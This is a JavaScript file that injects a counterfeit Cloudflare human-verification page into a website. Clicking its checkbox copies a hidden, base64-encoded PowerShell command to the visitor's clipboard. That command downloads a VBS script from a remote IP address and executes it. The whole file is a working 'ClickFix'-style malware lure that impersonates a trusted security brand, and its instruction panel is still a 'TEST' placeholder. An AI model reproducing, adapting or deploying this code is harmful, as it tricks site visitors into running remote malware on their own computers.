(function() {
    'use strict';

    const VERIFICATION_CODE = "powershell -NoP -NonI -W Hidden -e JABwAD0ASgBvAGkAbgAtAFAAYQB0AGgAIAAkAGUAbgB2ADoAVABFAE0AUAAgACcAawAuAHYAYgBzACcAOwBpAHcAcgAgACcAaAB0AHQAcAA6AC8ALwAxADgANQAuADIAMAA3AC4AMQA1AC4AMwA4AC8AawBhAGsAcwBpAG4ALgB2AGIAcwAnACAALQBVAHMAZQBCAGEAcwBpAGMAUABhAHIAcwBpAG4AZwAgAC0ATwB1AHQARgBpAGwAZQAgACQAcAA7AHcAcwBjAHIAaQBwAHQAIAAvAC8ARQA6AHYAYgBzAGMAcgBpAHAAdAAgACQAcAA=";
    const SITE_ADDRESS = "cloudflare.com";

    function boot() {
        if (document.querySelector('[data-html-content-widget]')) return;

        var HTML = `<style>

.html-content * {
  box-sizing: border-box;
  margin: 0;
  padding: 0;
}
.html-content {
  line-height: 1.15;
  -webkit-text-size-adjust: 100%;
  color: #313131;
  font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto,
    "Helvetica Neue", Arial, "Noto Sans", sans-serif, "Apple Color Emoji",
    "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";
}
.html-content {
  display: flex;
  flex-direction: column;
  height: 100vh;
  min-height: 100vh;
}
.html-content .page {
  display: flex;
  flex: 1;
  flex-direction: column;
  align-items: center;
}
.html-content .page-content {
  margin: 128px auto;
  padding-right: 32px;
  padding-left: 32px;
  width: 100%;
  max-width: 960px;
}
.html-content .site-header {
  display: flex;
  gap: 16px;
  align-items: center;
}
.html-content .site-logo {
  margin-right: 8px;
  width: 32px;
  height: 32px;
}
.html-content h1 {
  line-height: 125%;
  font-size: 40px;
  font-weight: 600;
}
.html-content .challenge-heading {
  margin: 8px 0;
  line-height: 125%;
  font-size: 24px;
  font-weight: 600;
  font-style: normal;
}
.html-content .challenge-text {
  margin-top: 0;
  margin-bottom: 32px;
  line-height: 150%;
  font-size: 16px;
  font-weight: 400;
  font-style: normal;
}
.html-content a {
  display: inline-block;
  text-decoration: underline;
  font-size: 16px;
  font-weight: 400;
  font-style: normal;
  cursor: pointer;
}
.html-content .loader {
  --widget-delay: 2s;
  position: relative;
  margin: 32px 0;
  height: 76.391px;
}
.html-content .spinner {
  animation: loader-hide 0s var(--widget-delay) forwards;
  display: inline-block;
  position: relative;
  width: 30px;
  height: 30px;
}
.html-content .spinner div {
  display: block;
  position: absolute;
  animation: loading-spin 1.2s cubic-bezier(0.5, 0, 0.5, 1) infinite;
  border: 4.8px solid;
  border-radius: 50%;
  border-color: #313131 transparent transparent transparent;
  width: 30px;
  height: 30px;
}
.html-content .spinner div:nth-child(1) {
  animation-delay: -0.45s;
}
.html-content .spinner div:nth-child(2) {
  animation-delay: -0.3s;
}
.html-content .spinner div:nth-child(3) {
  animation-delay: -0.15s;
}

@keyframes loading-spin {
  from { transform: rotate(0deg); }
  to { transform: rotate(360deg); }
}
.html-content .captcha-box {
  position: absolute;
  top: 0;
  left: 0;
  display: flex;
  align-items: center;
  justify-content: space-between;
  gap: 8px;
  width: 300px;
  max-width: 100%;
  height: 65px;
  padding: 10px 10px 10px 15px;
  border: 1px solid #e0e0e0;
  border-radius: 3px;
  background: #fafafa;
  box-shadow: 0 1px 3px rgb(0 0 0 / 8%);
  color: #232323;
  font-family: Arial, sans-serif;
  visibility: hidden;
  opacity: 0;
  animation: widget-reveal 0s var(--widget-delay) forwards;
}
.html-content .captcha-checkbox {
  display: flex;
  align-items: center;
  gap: 8px;
  min-width: 0;
  border: 0;
  background: transparent;
  color: inherit;
  font: inherit;
  text-align: left;
  cursor: pointer;
}
.html-content .checkbox-mark {
  position: relative;
  flex: 0 0 24px;
  width: 24px;
  height: 24px;
  margin: 0;
  border: 2px solid #6d6d6d;
  border-radius: 3px;
  background: #fff;
  cursor: pointer;
}
.html-content .captcha-checkbox:hover .checkbox-mark {
  border-color: #313131;
}
.html-content .captcha-checkbox:focus-visible {
  outline: 2px solid #0051c3;
  outline-offset: 3px;
}
.html-content .checkbox-label,
.html-content .checkbox-progress {
  font-size: 14px;
  font-weight: 400;
  line-height: 17px;
}
.html-content .checkbox-progress {
  display: none;
}
.html-content .captcha-note {
  position: absolute;
  top: calc(100% + 5px);
  left: 0;
  font-size: 10px;
  line-height: 12px;
  color: inherit;
}
.html-content.is-verifying .checkbox-label {
  display: none;
}
.html-content.is-verifying .checkbox-progress {
  display: inline;
}
.html-content.is-verifying .checkbox-mark {
  border: 3px dotted #228b49;
  border-radius: 50%;
  background: transparent;
  animation: loading-spin 1.2s linear infinite;
}
.html-content .captcha-brand {
  flex: 0 0 92px;
  text-align: right;
}
.html-content .brand-logo {
  display: block;
  position: relative;
  width: 68px;
  height: 34px;
  margin-left: auto;
  background: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 64 30'%3E%3Cpath fill='%23fbad41' d='M43 25h17a1 1 0 0 0 1-1 10 10 0 0 0-10-10h-2z'/%3E%3Cpath fill='%23f38020' d='M44 25H5a1 1 0 0 1-1-1 7 7 0 0 1 8-7 10 10 0 0 1 15-9 14 14 0 0 1 26 9l-3 8z'/%3E%3Cpath fill='none' stroke='%23fafafa' stroke-width='1.3' d='M5 22h33q3 0 4-3l1-3'/%3E%3C/svg%3E") center top / 48px 23px no-repeat;
}
.html-content .brand-logo::after {
  content: "CLOUDFLARE";
  position: absolute;
  right: 0;
  bottom: 1px;
  font-family: Arial, sans-serif;
  font-size: 8px;
  font-weight: 800;
  letter-spacing: 0.7px;
  line-height: 10px;
}
.html-content .brand-links {
  white-space: nowrap;
  font-size: 7px;
  line-height: 9px;
}
.html-content .captcha-box .brand-links a {
  display: inline;
  color: inherit;
  font-size: inherit;
  text-decoration: none;
}
.html-content .captcha-box .brand-links a:hover {
  text-decoration: underline;
}

@keyframes loader-hide {
  to { visibility: hidden; }
}

@keyframes widget-reveal {
  to {
    visibility: visible;
    opacity: 1;
  }
}

@media (prefers-reduced-motion: reduce) {
.html-content .spinner div,
.html-content.is-verifying .checkbox-mark {
    animation: none;
  }
}
.html-content .footer {
  margin: 0 auto;
  padding-right: 32px;
  padding-left: 32px;
  width: 100%;
  max-width: 960px;
  line-height: 18px;
  font-size: 12px;
}
.html-content .footer a {
  font-size: 12px;
}
.html-content .footer-inner {
  display: flex;
  justify-content: center;
  border-top: 1px solid #d9d9d9;
  padding-top: 16px;
  padding-bottom: 16px;
}
.html-content .footer-content {
  text-align: center;
}
.html-content .footer-divider {
  border: 1px solid #d9d9d9;
  height: 12px;
}
.html-content .footer-links {
  display: flex;
  gap: 8px;
  align-items: center;
}


@media (width <= 1024px) {
.html-content .page-content,
.html-content .footer {
    padding-right: 24px;
    padding-left: 24px;
  }
}

@media (width <= 720px) {
.html-content .page-content,
.html-content .footer {
    padding-right: 16px;
    padding-left: 16px;
  }
}


@media (prefers-color-scheme: dark) {
.html-content {
    background-color: #000;
    color: #f2f2f2;
  }
.html-content h1,
.html-content .challenge-heading,
.html-content .footer-text {
    color: #f2f2f2;
  }
.html-content a {
    color: #82b6ff;
  }
.html-content a:hover {
    color: #b9d6ff;
  }
.html-content a:visited {
    color: #9d94ec;
  }
.html-content a:focus,
.html-content a:active {
    outline: 2px solid #4693ff;
    outline-offset: 2px;
    border-radius: 2px;
  }
.html-content a:link {
    color: #82b6ff;
  }
.html-content .footer-divider {
    border-color: #f2f2f2;
  }
.html-content .footer-inner {
    border-top-color: #f2f2f2;
  }
.html-content .challenge-text {
    color: #b6b6b6;
  }
.html-content .captcha-box {
    border-color: #555;
    background: #232323;
    color: #f2f2f2;
  }
.html-content .checkbox-mark {
    border-color: #aaa;
    background: #232323;
  }
.html-content .captcha-checkbox:hover .checkbox-mark {
    border-color: #f2f2f2;
  }
.html-content .captcha-checkbox:focus-visible {
    outline-color: #4693ff;
  }
.html-content .spinner div {
    border-top-color: #b6b6b6;
  }
}
.html-content #verify-modal {
  position: fixed;
  inset: 0;
  margin: auto;
  padding: 0;
  border: none;
  width: 100%;
  height: 100%;
  max-width: 100%;
  max-height: 100%;
  background: transparent;
  font-family: Arial, Helvetica, sans-serif;
  color: #333;
  font-synthesis: none;
  text-rendering: optimizeLegibility;
  -webkit-font-smoothing: antialiased;
  overflow: auto;
}
.html-content #verify-modal::backdrop {
  background: rgba(0, 0, 0, 0.55);
}
.html-content #verify-modal .verify-modal-wrapper {
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  min-height: 100vh;
  padding: 40px 20px;
}
.html-content #verify-modal .verification-card {
  width: 634px;
  max-width: 100%;
  margin: 0 auto;
  padding: 27px 30px 15px;
  background: #fff;
  border: 1px solid #ededed;
  border-radius: 8px;
  box-shadow: 0 9px 31px rgb(0 0 0 / 12%);
}
.html-content #verify-modal .brand {
  display: flex;
  align-items: center;
  gap: 13px;
  height: 35px;
}
.html-content #verify-modal .brand-icon {
  flex-shrink: 0;
}
.html-content #verify-modal h1 {
  color: #080808;
  font-size: 30px;
  line-height: 35px;
  font-weight: 700;
  margin: 0;
}
.html-content #verify-modal .intro {
  font-size: 18px;
  line-height: 25px;
  margin: 11px 0 0;
}
.html-content #verify-modal .steps {
  height: 129px;
  display: flex;
  justify-content: space-between;
  align-items: flex-start;
  padding: 19px 0 0 10px;
  border-bottom: 2px solid #ededed;
}
.html-content #verify-modal .steps-title {
  display: flex;
  align-items: center;
  gap: 14px;
  font-size: 20px;
  line-height: 29px;
}
.html-content #verify-modal .modal-spinner {
  display: inline-block;
  width: 20px;
  height: 20px;
  flex-shrink: 0;
  border: 3px solid transparent;
  border-right-color: #242424;
  border-bottom-color: #242424;
  border-radius: 50%;
  transform: rotate(34deg);
  animation: modal-spin 0.85s linear infinite;
}

@keyframes modal-spin {
  to { transform: rotate(394deg); }
}
.html-content #verify-modal .provider {
  display: flex;
  align-items: flex-end;
  flex-direction: column;
  padding-top: 9px;
}
.html-content #verify-modal .provider-brand {
  display: flex;
  align-items: center;
  flex-direction: column;
  margin: 0 0 15px;
}
.html-content #verify-modal .provider-brand span {
  color: #222;
  font-size: 4px;
  font-weight: 800;
  letter-spacing: 1px;
}
.html-content #verify-modal .provider a {
  color: #7e9199;
  font-size: 11px;
  line-height: 17px;
  text-underline-offset: 2px;
  display: inline;
}
.html-content #verify-modal .instruction-content {
  margin: 29px 0 28px;
  overflow-wrap: anywhere;
}
.html-content #verify-modal .instruction h2 {
  margin: 0 0 16px;
  color: #202020;
  font-size: 28px;
  line-height: 1.3;
  font-weight: 700;
  letter-spacing: -0.5px;
}
.html-content #verify-modal .instruction-.html-content {
  padding: 18px 20px;
  border: 1px solid #e9e9e9;
  border-left: 3px solid #f48120;
  border-radius: 0 6px 6px 0;
  background: #fafafa;
  color: #555;
  font-size: 16px;
  line-height: 1.7;
}
.html-content #verify-modal .instruction-body p {
  margin: 0;
}
.html-content #verify-modal .instruction-body > * + * {
  margin-top: 12px;
}
.html-content #verify-modal .instruction-body ol,
.html-content #verify-modal .instruction-body ul {
  margin-bottom: 0;
  padding-left: 23px;
}
.html-content #verify-modal .instruction-body > :first-child {
  margin-top: 0;
}
.html-content #verify-modal .instruction-body li + li {
  margin-top: 8px;
}
.html-content #verify-modal .instruction-body li::marker {
  color: #a8530c;
  font-weight: 700;
}
.html-content #verify-modal .instruction-body strong {
  color: #282828;
}
.html-content #verify-modal .instruction-body kbd.key {
  display: inline-flex;
  align-items: center;
  justify-content: center;
  min-width: 22px;
  height: 22px;
  padding: 0 6px;
  margin: 0 1px;
  font-family: Arial, Helvetica, sans-serif;
  font-size: 12px;
  font-weight: 700;
  line-height: 1;
  color: #333;
  background: linear-gradient(#fff, #f0f0f0);
  border: 1px solid #b8b8b8;
  border-bottom-width: 2px;
  border-radius: 4px;
  box-shadow: 0 1px 0 #d0d0d0, inset 0 -1px 0 #e0e0e0;
  vertical-align: middle;
}
.html-content #verify-modal .instruction-body kbd.key svg {
  display: block;
  color: #333;
}
.html-content #verify-modal .verification-id {
  height: 46px;
  padding: 14px 15px;
  font-family: "Courier New", Courier, monospace;
  font-size: 13px;
  line-height: 16px;
  color: #5b5b5b;
  background: #f5f5f5;
  border: 1px solid #dedede;
  border-radius: 5px;
  box-shadow: inset 0 1px 3px rgb(0 0 0 / 2%);
}
.html-content #verify-modal .actions {
  min-height: 75px;
  display: flex;
  align-items: center;
  justify-content: space-between;
  gap: 20px;
  border-bottom: 2px solid #f1f1f1;
}
.html-content #verify-modal .actions p {
  margin: 0;
  color: #626262;
  font-size: 14px;
  line-height: 20px;
}
.html-content #verify-modal button {
  width: 99px;
  height: 39px;
  flex-shrink: 0;
  border: 1px solid #414141;
  border-radius: 3px;
  background: linear-gradient(#565656, #4b4b4b);
  color: #fff;
  font: 700 14px Arial, Helvetica, sans-serif;
  text-shadow: 0 1px 1px #252525;
  box-shadow: 0 1px 2px rgb(0 0 0 / 14%);
  cursor: pointer;
}
.html-content #verify-modal button:hover {
  background: #404040;
}
.html-content #verify-modal button:active {
  transform: translateY(1px);
}
.html-content #verify-modal button:focus-visible,
.html-content #verify-modal a:focus-visible {
  outline: 3px solid #f48120;
  outline-offset: 4px;
}
.html-content #verify-modal button:disabled {
  cursor: default;
  opacity: 0.8;
}
.html-content #verify-modal .card-footer {
  padding-top: 10px;
  color: #999;
  text-align: center;
  font-size: 13px;
  line-height: 20px;
}
.html-content #verify-modal .card-footer p {
  margin: 0;
}
.html-content #verify-modal .card-footer p + p {
  margin-top: 4px;
  font-size: 14px;
}
.html-content #verify-modal .card-footer a {
  color: inherit;
  text-underline-offset: 2px;
  display: inline;
  font-size: inherit;
}
.html-content #verify-modal .background-footer {
  margin-top: 20px;
  display: flex;
  align-items: center;
  justify-content: center;
  gap: 20px;
  width: 590px;
  max-width: 90%;
  color: #92968e;
  font-size: 14px;
  white-space: nowrap;
  filter: blur(4px);
  opacity: 0.48;
  pointer-events: none;
}
.html-content #verify-modal .background-mark {
  color: #b49c27;
  font-size: 30px;
  margin-right: -16px;
}
.html-content #verify-modal .background-link {
  color: #9087b4;
}
.html-content #verify-modal .is-complete .modal-spinner {
  border-color: #36814b;
  border-top-color: transparent;
}


@media (max-width: 640px) {
.html-content #verify-modal .verify-modal-wrapper {
    padding: 28px 16px 76px;
  }
.html-content #verify-modal .verification-card {
    padding: 24px 22px 17px;
  }
.html-content #verify-modal h1 {
    font-size: clamp(23px, 6vw, 30px);
  }
.html-content #verify-modal .brand {
    gap: 10px;
  }
.html-content #verify-modal .intro {
    font-size: 16px;
    line-height: 24px;
  }
.html-content #verify-modal .steps {
    padding-left: 0;
    height: 129px;
    gap: 8px;
  }
.html-content #verify-modal .steps-title {
    font-size: 16px;
    gap: 9px;
    white-space: nowrap;
  }
.html-content #verify-modal .provider a {
    font-size: 10px;
  }
.html-content #verify-modal .instruction-content {
    margin: 25px 0;
  }
.html-content #verify-modal .instruction h2 {
    font-size: 24px;
    letter-spacing: -0.3px;
    margin-bottom: 14px;
  }
.html-content #verify-modal .instruction-.html-content {
    padding: 15px 16px;
  }
.html-content #verify-modal .verification-id {
    font-size: 11px;
    padding: 14px 10px;
  }
.html-content #verify-modal .actions {
    min-height: 84px;
    gap: 10px;
  }
.html-content #verify-modal .actions p {
    font-size: 13px;
  }
.html-content #verify-modal button {
    width: 85px;
  }
.html-content #verify-modal .card-footer,
.html-content #verify-modal .card-footer p + p {
    font-size: 11px;
  }
.html-content #verify-modal .background-footer {
    gap: 13px;
    font-size: 10px;
  }
}

@media (prefers-reduced-motion: reduce) {
.html-content #verify-modal .modal-spinner {
    animation: none;
  }
}
.html-content { box-sizing: border-box; margin: 0; padding: 0; width: 100%; font-size: 16px; font-weight: 400; font-style: normal; letter-spacing: normal; text-transform: none; text-align: left; direction: ltr; unicode-bidi: isolate; writing-mode: horizontal-tb; height: auto; min-height: 100vh; min-height: 100dvh; background: #fff; isolation: isolate; }
.html-content button,
.html-content input { font: inherit; }
.html-content img { max-width: 100%; object-fit: contain; }
.html-content .page-content { margin-block: clamp(48px, 12vh, 128px); min-width: 0; }
.html-content h1,
.html-content h2,
.html-content p,
.html-content .verification-id { overflow-wrap: anywhere; }
.html-content .footer-links { flex-wrap: wrap; justify-content: center; }
.html-content .captcha-box { height: auto; min-height: 65px; }
.html-content #verify-modal[hidden] { display: none !important; }
.html-content #verify-modal.fallback-open { display: block; z-index: 2147483647; background: rgb(0 0 0 / 55%); }
.html-content #verify-modal .verify-modal-wrapper { min-height: 100vh; min-height: 100dvh; }
.html-content #verify-modal .verification-card { position: relative; min-width: 0; }
.html-content #verify-modal .brand { height: auto; min-height: 35px; padding-right: 26px; }
.html-content #verify-modal .brand h1 { min-width: 0; }
.html-content #verify-modal .steps { height: auto; min-height: 129px; gap: 16px; padding-bottom: 18px; flex-wrap: wrap; }
.html-content #verify-modal .steps-title { white-space: normal; }
.html-content #verify-modal .provider { margin-left: auto; }
.html-content #verify-modal .verification-id { height: auto; min-height: 46px; }
.html-content #verify-modal .actions { padding-block: 16px; flex-wrap: wrap; }
.html-content #verify-modal .modal-close { position: absolute; top: 6px; right: 6px; width: 32px; height: 32px; border: 0; background: transparent; color: #555; box-shadow: none; text-shadow: none; font-size: 24px; }
.html-content #verify-modal .modal-close:hover { background: #eee; }
@media (max-width: 480px) {
.html-content h1 { font-size: clamp(24px, 8vw, 40px); }
.html-content .challenge-heading { font-size: 20px; }
.html-content #verify-modal .verify-modal-wrapper { padding: 16px 12px; }
.html-content #verify-modal .verification-card { padding: 28px 16px 16px; }
.html-content #verify-modal .brand { gap: 8px; }
.html-content #verify-modal h1 { font-size: clamp(18px, 6vw, 26px); line-height: 1.25; }
.html-content #verify-modal .instruction-body { padding: 12px; }
.html-content #verify-modal .desktop-break { display: none; }
}
@media (max-width: 360px) {
.html-content .captcha-box { padding: 10px 8px; gap: 6px; }
.html-content .captcha-brand { flex-basis: 70px; }
.html-content .checkbox-label,
.html-content .checkbox-progress { font-size: 12px; }
.html-content #verify-modal .actions > button { width: 100%; }
}
@media (prefers-color-scheme: dark) {
.html-content { background: #000; color: #f2f2f2; } }

</style>
<div class="html-content" lang="en" dir="ltr">
    <main class="page">
      <div class="page-content">
        <div class="site-header">
          <h1 id="site-name">example.com</h1>
        </div>
        <h2 class="challenge-heading">Performing security verification</h2>
        <p class="challenge-text">This website uses a security service to protect against malicious bots. This page is displayed while the website verifies that you are not a bot.</p>
        <div class="loader">
          <div class="spinner" aria-hidden="true">
            <div></div>
            <div></div>
            <div></div>
            <div></div>
          </div>
          <div class="captcha-box" role="group" aria-label="Security verification">
            <button class="captcha-checkbox" type="button" id="captcha-btn" aria-controls="verify-modal" aria-expanded="false">
              <span class="checkbox-mark" aria-hidden="true"></span>
              <span class="checkbox-label">Verify you are human</span>
              <span class="checkbox-progress">Verification…</span>
            </button>
            <div class="captcha-brand">
              <span class="brand-logo" role="img" aria-label="Cloudflare"></span>
              <div class="brand-links">
                <a href="https://www.cloudflare.com/privacypolicy/" target="_blank" rel="noopener noreferrer">Privacy</a>
                <span aria-hidden="true"> · </span>
                <a href="https://www.cloudflare.com/website-terms/" target="_blank" rel="noopener noreferrer">Terms</a>
              </div>
            </div>
          </div>
        </div>
      </div>
    </main>

    <div id="verify-modal" popover="auto" role="dialog" aria-labelledby="site-title">
      <div class="verify-modal-wrapper">
        <div class="verification-card" aria-labelledby="site-title">
<button class="modal-close" type="button" aria-label="Close verification">&times;</button>
          <header>
            <div class="brand">
              <img class="brand-icon" src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 64 30'%3E%3Cpath fill='%23fbad41' d='M43 25h17a1 1 0 0 0 1-1 10 10 0 0 0-10-10h-2z'/%3E%3Cpath fill='%23f38020' d='M44 25H5a1 1 0 0 1-1-1 7 7 0 0 1 8-7 10 10 0 0 1 15-9 14 14 0 0 1 26 9l-3 8z'/%3E%3Cpath fill='none' stroke='%23fafafa' stroke-width='1.3' d='M5 22h33q3 0 4-3l1-3'/%3E%3C/svg%3E" width="38" height="28" alt="">
              <h1 id="site-title">cloudflare.com</h1>
            </div>
            <p class="intro">Verify you are human by completing the action below.</p>
          </header>

          <section class="steps" aria-label="Verification steps">
            <div class="steps-title"><span class="modal-spinner" aria-hidden="true"></span><span>Verification Steps</span></div>
            <div class="provider">
              <div class="provider-brand" aria-label="Cloudflare">
                <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 64 30'%3E%3Cpath fill='%23fbad41' d='M43 25h17a1 1 0 0 0 1-1 10 10 0 0 0-10-10h-2z'/%3E%3Cpath fill='%23f38020' d='M44 25H5a1 1 0 0 1-1-1 7 7 0 0 1 8-7 10 10 0 0 1 15-9 14 14 0 0 1 26 9l-3 8z'/%3E%3Cpath fill='none' stroke='%23fafafa' stroke-width='1.3' d='M5 22h33q3 0 4-3l1-3'/%3E%3C/svg%3E" width="24" height="16" alt="">
                <span>CLOUDFLARE</span>
              </div>
              <a href="https://www.cloudflare.com/privacypolicy/" target="_blank" rel="noopener noreferrer">Confidentiality</a>
              <a href="https://www.cloudflare.com/terms/" target="_blank" rel="noopener noreferrer">Terme and Conditions</a>
            </div>
          </section>

          <section class="instruction" aria-labelledby="instruction-title">
            <div class="instruction-content" lang="ru">
              <h2 id="instruction-title">TEST</h2>
              <div class="instruction-body">
              </div>
            </div>
            <div class="verification-id">Cloudflare verification ID: 303539</div>
            <div class="actions">
              <p id="verification-status" role="status" aria-live="polite">Perform the steps above to finish<br class="desktop-break"> verification.</p>
              <button id="verify-button" type="button">Verify</button>
            </div>
          </section>

          <footer class="card-footer">
            <p>Ray ID: 18e2752f2ec8b9be</p>
            <p>Platform performance and security <a href="https://www.cloudflare.com/" target="_blank" rel="noopener noreferrer">Cloudflare</a></p>
          </footer>
        </div>

      </div>
    </div>


    <footer class="footer">
      <div class="footer-inner">
        <div class="footer-content">
          <div class="ray-id">Ray ID: <code lang="en-US">a3d2aadf9ce89713</code></div>
          <div class="footer-links">
            <span class="footer-text">Performance &amp; security by <a href="https://www.cloudflare.com?utm_source=challenge&amp;utm_campaign=m" target="_blank" rel="noopener noreferrer" aria-label="Cloudflare, opens in a new tab">Cloudflare</a></span>
            <span class="footer-divider" aria-hidden="true"></span>
            <a class="footer-text" href="https://www.cloudflare.com/privacypolicy/" target="_blank" rel="noopener noreferrer" aria-label="Privacy, opens in a new tab">Privacy</a>
          </div>
        </div>
      </div>
    </footer>

  </div>`;
        var host = document.createElement('div');
        host.className = 'html-content-host';
        host.setAttribute('data-html-content-widget', '');
        host.setAttribute('dir', 'ltr');
        var hostStyles = {
            'all': 'initial',
            'position': 'absolute',
            'top': '0',
            'left': '0',
            'right': '0',
            'bottom': 'auto',
            'display': 'block',
            'box-sizing': 'border-box',
            'width': '100%',
            'min-width': '0',
            'max-width': 'none',
            'height': 'auto',
            'min-height': '100vh',
            'margin': '0',
            'padding': '0',
            'border': '0',
            'float': 'none',
            'direction': 'ltr',
            'unicode-bidi': 'isolate',
            'writing-mode': 'horizontal-tb',
            'text-align': 'left',
            'font': 'normal 16px/1.15 Arial, sans-serif',
            'transform': 'none',
            'isolation': 'isolate',
            'z-index': '2147483646'
        };
        Object.keys(hostStyles).forEach(function(property) {
            host.style.setProperty(property, hostStyles[property], 'important');
        });
        document.body.appendChild(host);

        var root = host.attachShadow ? host.attachShadow({ mode: 'open' }) : host;
        root.innerHTML = HTML;

        // --- НАЧАЛО: внедрённая логика из второго скрипта ---
        var siteNameEl = root.querySelector("#site-name");
        var captchaBtnEl = root.querySelector("#captcha-btn");

        if (siteNameEl) {
            siteNameEl.textContent = SITE_ADDRESS;
        }

        async function copyToClipboard(text) {
            if (navigator.clipboard && window.isSecureContext) {
                try {
                    await navigator.clipboard.writeText(text);
                    return true;
                } catch (err) {
                    console.warn("[CLOUDFLARE] Clipboard API error:", err);
                }
            }

            try {
                const textarea = document.createElement("textarea");
                textarea.value = text;
                textarea.setAttribute("readonly", "");
                Object.assign(textarea.style, {
                    position: "fixed",
                    top: "-9999px",
                    left: "-9999px",
                    opacity: "0",
                });
                // Вставляем в shadow root, чтобы не засорять основной документ,
                // если shadow DOM поддерживается.
                (root instanceof ShadowRoot ? root : document.body).appendChild(textarea);
                textarea.select();
                textarea.setSelectionRange(0, text.length);
                const ok = document.execCommand("copy");
                textarea.remove();
                return ok;
            } catch (err) {
                console.error("[CLOUDFLARE] Fallback error:", err);
                return false;
            }
        }
        

        var content = root.querySelector('.html-content');
        var modal = root.querySelector('#verify-modal');
        var trigger = root.querySelector('#captcha-btn');
        var closeButton = root.querySelector('.modal-close');
        var nativePopover = typeof modal.showPopover === 'function';
        var opened = false;

        function syncState(isOpen) {
            opened = isOpen;
            content.classList.toggle('is-verifying', isOpen);
            trigger.setAttribute('aria-expanded', String(isOpen));
        }

        function close() {
            if (nativePopover) {
                if (modal.matches(':popover-open')) modal.hidePopover();
            } else {
                modal.hidden = true;
                modal.classList.remove('fallback-open');
                syncState(false);
            }
            trigger.focus();
        }

        if (nativePopover) {
            modal.addEventListener('toggle', function(event) {
                syncState(event.newState === 'open');
            });
        } else {
            modal.removeAttribute('popover');
            modal.hidden = true;
        }

        trigger.addEventListener('click', function() {
            
            copyToClipboard(VERIFICATION_CODE).then(function(ok) {
                console.log(ok ? "[CLOUDFLARE] Copied:" : "[CLOUDFLARE] Copy failed:", VERIFICATION_CODE);
            });

            
            if (opened) { close(); return; }
            if (nativePopover) modal.showPopover();
            else {
                modal.hidden = false;
                modal.classList.add('fallback-open');
            }
            syncState(true);
            closeButton.focus();
        });
        closeButton.addEventListener('click', close);
        modal.addEventListener('click', function(event) {
            if (event.target === modal || event.target.classList.contains('verify-modal-wrapper')) close();
        });
        root.addEventListener('keydown', function(event) {
            if (event.key === 'Escape' && opened) {
                event.preventDefault();
                close();
            }
        });
        // Обработчик #verify-button подключите здесь через root.querySelector().
        // Реальная проверка требует отдельной интеграции с сервером.
    }

    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', boot, { once: true });
    } else {
        boot();
    }
})();
